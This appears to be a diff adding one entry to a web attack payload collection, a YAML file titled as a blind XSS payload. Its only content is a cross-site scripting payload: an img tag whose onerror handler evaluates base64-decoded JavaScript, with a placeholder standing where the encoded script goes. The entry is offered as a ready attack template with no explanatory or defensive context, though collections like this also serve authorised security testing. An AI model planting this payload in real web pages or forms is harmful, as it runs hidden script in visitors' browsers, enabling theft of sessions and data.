@@ -1,0 +1,8 @@
+metadata:
+  filename: "xss-blind-img-onerror-script-input-base64.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <img src=x onerror='eval(atob("<base64_js_code>"));'/>
